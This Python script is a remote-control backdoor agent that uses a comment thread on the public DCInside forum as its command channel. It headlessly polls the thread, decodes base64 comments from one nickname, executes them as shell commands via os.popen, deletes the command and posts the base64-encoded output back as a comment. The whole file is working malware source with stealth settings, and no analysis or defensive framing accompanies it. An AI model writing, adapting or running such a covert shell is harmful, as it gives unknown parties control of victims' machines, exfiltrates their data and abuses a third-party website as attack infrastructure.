from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup
import base64
import os
import time

# 실행된 명령어 추적
processed_commands = set()

def create_driver():
    options = Options()
    # headless 모드 제거하여 디버깅 (필요시 다시 추가)
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

def get_comments(driver, url):
    try:
        driver.get(url)
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "usertxt"))
        )
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        comments = []
        for cmt in soup.select(".cmt_info.clear"):
            nick = cmt.select_one(".nickname em[title]")
            content = cmt.select_one(".usertxt")
            if nick and content:
                comments.append((nick.get('title'), content.get_text(strip=True)))
        return comments
    except Exception as e:
        print(f"[!] 댓글 파싱 오류: {e}")
        return []

def delete_comment(driver, encoded_comment):
    """
    특정 댓글을 삭제하는 함수
    encoded_comment: 삭제할 댓글의 base64 인코딩된 내용
    """
    try:
        print(f'[*] 댓글 삭제 시작: {encoded_comment[:20]}...')
        
        # 현재 페이지에서 해당 댓글을 찾기
        comments = driver.find_elements(By.CSS_SELECTOR, ".cmt_info.clear")
        
        for comment_elem in comments:
            try:
                # 댓글 내용 확인
                content_elem = comment_elem.find_element(By.CSS_SELECTOR, ".usertxt")
                if content_elem.text.strip() == encoded_comment:
                    print('[*] 삭제할 댓글을 찾았습니다.')
                    
                    # 삭제 버튼 찾기 및 클릭
                    delete_btn = comment_elem.find_element(By.CSS_SELECTOR, ".btn_cmt_delete")
                    driver.execute_script("arguments[0].click();", delete_btn)
                    print('[*] 삭제 버튼 클릭 완료')
                    
                    # 비밀번호 입력 필드가 나타날 때까지 대기
                    password_input = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "cmt_password")))
                    
                    # 비밀번호 입력
                    password_input.clear()
                    password_input.send_keys("0000")
                    print('[*] 비밀번호 입력 완료')
                    
                    # 확인 버튼 클릭
                    confirm_btn = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.CSS_SELECTOR, ".btn_ok")))
                    driver.execute_script("arguments[0].click();", confirm_btn)
                    print('[*] 확인 버튼 클릭 완료')
                    
                    # 삭제 완료 알림창 처리
                    try:
                        WebDriverWait(driver, 3).until(EC.alert_is_present())
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        print(f'[*] 알림창 감지: {alert_text}')
                        alert.accept()
                        print('[*] 알림창 확인 완료')
                    except:
                        print('[*] 알림창 없음 또는 이미 처리됨')
                    
                    time.sleep(1)
                    print('[+] 댓글 삭제 완료')
                    return True
                    
            except Exception as inner_e:
                # 개별 댓글 처리 중 오류는 무시하고 다음 댓글로 진행
                continue
        
        print('[-] 삭제할 댓글을 찾지 못했습니다.')
        return False
        
    except Exception as e:
        print(f"[!] 댓글 삭제 실패: {e}")
        return False

def write_comment(driver, result):
    """
    명령어 실행 결과를 base64로 인코딩하여 댓글로 등록하는 함수
    driver: selenium webdriver 인스턴스
    result: 명령어 실행 결과 텍스트
    """
    try:
        print(f'[*] 댓글 등록 시작: {result[:50]}...')
        
        # 결과를 base64로 인코딩
        encoded_result = base64.b64encode(result.encode('utf-8')).decode('utf-8')
        print(f'[*] Base64 인코딩 완료: {encoded_result[:30]}...')
        
        # 페이지가 완전히 로드될 때까지 대기
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='name']")))
        
        # 고정닉 해제 버튼 클릭 (있다면)
        try:
            # 고정닉 해제 버튼 찾기 (게시글 번호가 포함된 ID)
            nick_clear_buttons = driver.find_elements(By.CSS_SELECTOR, "button[id*='btn_gall_nick_name_x_']")
            if nick_clear_buttons:
                nick_clear_btn = nick_clear_buttons[0]
                if nick_clear_btn.is_displayed():
                    driver.execute_script("arguments[0].click();", nick_clear_btn)
                    print('[*] 고정닉 해제 버튼 클릭 완료')
                    time.sleep(1)
        except Exception as e:
            print(f'[*] 고정닉 해제 버튼 없음 또는 오류: {e}')
        
        # 닉네임 입력
        try:
            name_input = driver.find_element(By.CSS_SELECTOR, "input[name='name'][placeholder='닉네임']")
        except:
            name_inputs = driver.find_elements(By.CSS_SELECTOR, "input[id^='name_']")
            if name_inputs:
                name_input = name_inputs[0]
            else:
                raise Exception("닉네임 입력 필드를 찾을 수 없습니다.")
        
        # 요소가 보이도록 스크롤
        driver.execute_script("arguments[0].scrollIntoView(true);", name_input)
        time.sleep(0.5)
        
        # 닉네임 필드가 활성화되었는지 확인
        if not name_input.is_enabled():
            raise Exception("닉네임 입력 필드가 여전히 비활성화 상태입니다.")
        
        name_input.clear()
        name_input.send_keys("ㅇㅇㅇ")
        print('[*] 닉네임 입력 완료 (결과용: ㅇㅇㅇ)')
        
        # 비밀번호 입력
        try:
            password_input = driver.find_element(By.CSS_SELECTOR, "input[name='password'][placeholder='비밀번호']")
        except:
            password_inputs = driver.find_elements(By.CSS_SELECTOR, "input[id^='password_']")
            if password_inputs:
                password_input = password_inputs[0]
            else:
                raise Exception("비밀번호 입력 필드를 찾을 수 없습니다.")
        
        password_input.clear()
        password_input.send_keys("0000")
        print('[*] 비밀번호 입력 완료')
        
        # 댓글 텍스트 영역 처리
        print('[*] 댓글 입력 영역을 찾는 중...')
        
        # 여러 방법으로 textarea 찾기 시도
        comment_textarea = None
        selectors = [
            "textarea[name='comment_memo']",
            "textarea.cmt_txt",
            "textarea",
            "#comment_memo"
        ]
        
        for selector in selectors:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                for elem in elements:
                    if elem.is_displayed():
                        comment_textarea = elem
                        print(f'[*] textarea 찾음: {selector}')
                        break
                if comment_textarea:
                    break
            except:
                continue
        
        if not comment_textarea:
            raise Exception("댓글 입력 영역을 찾을 수 없습니다.")
        
        # 라벨 클릭하여 textarea 활성화 (있다면)
        try:
            label = driver.find_element(By.CSS_SELECTOR, ".cmt_textarea_label")
            if label.is_displayed():
                driver.execute_script("arguments[0].click();", label)
                time.sleep(1)
                print('[*] 라벨 클릭 완료')
        except:
            print('[*] 라벨 없음, textarea 직접 사용')
        
        # textarea로 스크롤
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", comment_textarea)
        time.sleep(1)
        
        # textarea 활성화 및 내용 입력
        driver.execute_script("arguments[0].focus();", comment_textarea)
        time.sleep(0.5)
        
        # 기존 내용 제거 후 새 내용 입력
        driver.execute_script("arguments[0].value = '';", comment_textarea)
        driver.execute_script("arguments[0].value = arguments[1];", comment_textarea, encoded_result)
        
        # 이벤트 발생시켜 웹페이지가 변경을 인식하도록 함, 이건 또 처음보네
        driver.execute_script("""
            var element = arguments[0];
            element.dispatchEvent(new Event('input', { bubbles: true }));
            element.dispatchEvent(new Event('change', { bubbles: true }));
        """, comment_textarea)
        
        print('[*] 댓글 내용 입력 완료')
        
        # 댓글 등록 버튼 찾기
        print('[*] 등록 버튼을 찾는 중...')
        submit_button = None
        button_selectors = [
            "button[onclick*='comment_submit']",
            ".btn_blue",
            "button[type='submit']",
            "input[type='submit']",
            ".comment_submit_btn"
        ]
        
        for selector in button_selectors:
            try:
                buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                for btn in buttons:
                    if btn.is_displayed() and btn.is_enabled():
                        submit_button = btn
                        print(f'[*] 등록 버튼 찾음: {selector}')
                        break
                if submit_button:
                    break
            except:
                continue
        
        if not submit_button:
            raise Exception("댓글 등록 버튼을 찾을 수 없습니다.")
        
        # 버튼으로 스크롤하여 화면에 보이게 함
        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", submit_button)
        time.sleep(1)
        
        # 버튼 클릭
        driver.execute_script("arguments[0].click();", submit_button)
        print('[*] 댓글 등록 버튼 클릭 완료')
        
        # 등록 완료 대기
        time.sleep(3)
        
        # 등록 후 알림창 처리
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            print(f'[*] 댓글 등록 알림: {alert_text}')
            alert.accept()
        except:
            print('[*] 알림창 없음')
        
        print('[+] 댓글 등록 완료')
        return True
        
    except Exception as e:
        print(f"[!] 댓글 등록 실패: {e}")
        return False

def execute_command(driver, encoded_comment):
    try:
        decoded = base64.b64decode(encoded_comment).decode('utf-8')
    except Exception as e:
        print(f"[!] base64 디코딩 실패: {e}")
        return False

    if decoded in processed_commands:
        print(f"[-] 이미 처리된 명령어: {decoded}")
        return False

    processed_commands.add(decoded)
    print(f'[+] 명령어 감지: {decoded}')
    
    try:
        output = os.popen(decoded).read().strip()
        print(f'[+] 명령어 결과: {output}')
        
        # 먼저 명령어 댓글 삭제
        delete_success = delete_comment(driver, encoded_comment)
        if delete_success:
            print('[+] 명령어 댓글 삭제 완료')
        else:
            print('[-] 명령어 댓글 삭제 실패')
        
        # 삭제 후 잠시 대기
        time.sleep(2)
        
        # 그 다음 결과 댓글 등록
        write_success = write_comment(driver, output)
        if write_success:
            print('[+] 결과 댓글 등록 완료')
        else:
            print('[-] 결과 댓글 등록 실패')
            
        return True
    except Exception as e:
        print(f"[!] 명령어 실행 실패: {e}")
        return False

def check_and_execute_commands(driver, comments):
    command_count = 0
    for nick, comment in comments:
        if nick == 'ㅇㅇ':
            result = execute_command(driver, comment)
            if result:
                command_count += 1
                # 댓글 삭제 후 페이지 새로고침 (알림창 처리 후)
                print('[*] 페이지 새로고침 중...')
                try:
                    # 혹시 남아있을 수 있는 알림창 확인
                    WebDriverWait(driver, 1).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert.accept()
                    print('[*] 추가 알림창 처리 완료')
                except:
                    pass  # 알림창이 없으면 무시
                
                time.sleep(1)
                driver.refresh()
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "usertxt"))
                )
                print('[*] 페이지 새로고침 완료')
                break  # 한 번에 하나씩 처리
    
    if command_count == 0:
        print('[-] 실행할 새로운 명령어가 없습니다.')
    else:
        print(f'[+] 총 {command_count}개의 명령어를 순차 실행 완료.')

def main():
    gall_url = 'https://gall.dcinside.com/board/view/?id=leagueoflegends6&no=2746818'
    driver = create_driver()
    
    try:
        while True:
            print('[*] 댓글 추출 중...')
            comments = get_comments(driver, gall_url)
            check_and_execute_commands(driver, comments)
            time.sleep(5)
    except KeyboardInterrupt:
        print('\n[*] 프로그램 종료')
    finally:
        driver.quit()

if __name__ == '__main__':
    main()